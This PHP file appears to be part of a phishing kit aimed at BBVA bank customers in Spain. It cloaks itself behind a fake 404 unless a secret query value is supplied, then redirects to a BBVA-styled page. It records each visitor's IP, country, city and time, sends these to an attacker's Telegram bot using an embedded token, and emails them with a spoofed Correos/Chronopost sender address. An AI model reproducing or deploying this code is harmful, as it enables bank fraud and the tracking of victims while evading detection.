

<?php


if(isset($_GET["clp"])&&$_GET["clp"]=="327598323") {
header("Location: Seleccione_BBVA.html");
}else{header('HTTP/1.0 404 Not Found');exit();}

?>

<?php 













date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ;
$CITY = $J7->geoplugin_city ;

$ip = getenv("REMOTE_ADDR");







            $message = "🌍COUNTRY :" . $COUNTRY . "\n⏳TIME :" . $TIME ."\n🌆CITY :" . $CITY . "\n" . $ip . "\n*************🇪🇸🇪🇸************\n";




           
$file = fopen("visit.txt","a");fwrite($file,$ip." - ".$TIME." - " . $COUNTRY ." - " . $CITY ."\n") ;



fwrite($file, $message);
            fclose($file);
			$to = "";
			$subject = "vu :🇪🇸🇪🇸";
			$tok="1758642481:AAGjK1wO7sRCi4D7NBSDVk-a0C4fl2jnvWA";
            $user="-1001324167344";
            $request=[
              'chat_id' => $user,
              'text' => $subject."
            ".$message
            ];
            $request_url="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request);
            file_get_contents($request_url);
			$headers = "From:Info <Chronopost@correos.es>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			mail($to, $subject, $message, $headers);



?>




